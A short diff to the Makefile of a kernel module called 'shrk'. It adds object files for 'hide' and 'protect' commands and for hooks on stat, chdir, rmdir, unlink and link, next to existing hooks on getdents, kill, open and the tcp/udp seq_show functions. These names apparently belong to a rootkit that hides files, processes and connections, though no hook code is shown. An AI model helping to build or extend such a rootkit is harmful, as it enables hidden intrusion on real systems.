@@ -25,13 +25,18 @@ shrk-objs := main.o               \
              util.o               \
              cmds.o               \
              hooks.o              \
+             cmds/hide.o          \
+             cmds/protect.o       \
+             hooks/link.o         \
              hooks/open.o         \
              hooks/kill.o         \
+             hooks/stat.o         \
+             hooks/chdir.o        \
+             hooks/rmdir.o        \
+             hooks/unlink.o       \
              hooks/getdents.o     \
              hooks/tcp_seq_show.o \
-             hooks/udp_seq_show.o \
-             cmds/protect.o       \
-             cmds/hide.o
+             hooks/udp_seq_show.o
 #        hooks/statx.o      \
 #        hooks/chdir.o      \
 #        hooks/write.o      \
